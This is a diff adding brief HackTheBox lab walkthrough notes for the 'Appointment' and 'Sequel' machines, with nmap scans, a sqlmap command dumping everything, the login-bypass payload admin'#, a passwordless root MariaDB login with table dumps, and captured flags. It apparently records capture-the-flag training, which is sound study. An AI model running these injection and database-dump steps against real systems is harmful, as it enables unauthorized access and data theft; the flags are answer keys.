@@ -44,3 +44,58 @@ select 0
 keys *
 get flag
 03e1d2b376c37ab3f5319922053953eb
+
+# Appointment
+HackTheBox Appointment Walkthrough
+10.129.152.119
+What does the acronym SQL stand for?
+Structured Query Language
+
+What is one of the most common types of SQL vulnerabilities?
+SQL injection
+
+What is the 2021 OWASP Top 10 classification for SQL injection vulnerability?
+A03:2021-Injection
+
+What does Nmap report as the service and version that are running on port 80 of the target?
+nmap -sV 10.129.152.119
+Apache httpd 2.4.38 ((Debian))
+
+What is the standard port used for the HTTPS protocol?
+443
+
+What is a folder called in web application terminology?
+directory
+
+What is the HTTP response code is given for ‘Not Found’ errors?
+404
+
+dir
+
+What single character can be used to comment out the rest of a line in MySQL?
+#
+
+sqlmap -u http://10.129.152.119/ --data="username=admin&password=pass" -a
+admin'#
+
+Congratulations!
+
+Your flag is: e3d0796d002a446c0e622226f42e9672
+
+# Sequel
+HackTheBox Sequel Walkthrough
+10.129.85.234
+nmap -p 3306-3306 -sV -sC 10.129.85.234
+3306
+MariaDB
+-u
+root
+mysql -u root -h 10.129.85.234
+* 
+;
+show databases;
+htb
+use htb;
+show tables;
+SELECT * from config;
+7b4bec00d1a39e3dd4e021ec3d915da8
